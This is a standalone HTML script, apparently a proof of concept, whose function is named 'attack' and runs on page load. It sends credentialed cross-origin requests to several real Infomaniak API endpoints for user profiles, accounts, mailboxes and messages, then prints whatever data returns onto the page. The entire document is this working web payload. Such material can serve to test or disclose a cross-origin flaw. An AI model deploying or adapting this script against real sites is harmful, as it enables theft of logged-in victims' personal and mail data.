
<script>
async function attack() {
  const output = document.getElementById('output');

  const endpoints = [
    "https://api.infomaniak.com/1/user",
    "https://api.infomaniak.com/1/user/profile",
    "https://api.infomaniak.com/1/account",
    "https://api.infomaniak.com/1/account/profile",
    "https://api.infomaniak.com/1/mailboxes",
    "https://api.infomaniak.com/1/messages",
    "https://api.infomaniak.com/2/user",
    "https://api.infomaniak.com/2/user/profile",
    "https://api.infomaniak.com/3/account/profile"
  ];

  let results = "";

  for (const url of endpoints) {
    try {
      const res = await fetch(url, {
        method: "GET",
        credentials: "include"
      });

      const text = await res.text(); // not json() in case of HTML error pages

      results += `[${url}] STATUS: ${res.status}\n${text}\n\n`;
    } catch (err) {
      results += `[${url}] ERROR: ${err}\n\n`;
    }
  }

  output.textContent = results;
}

attack();
</script>
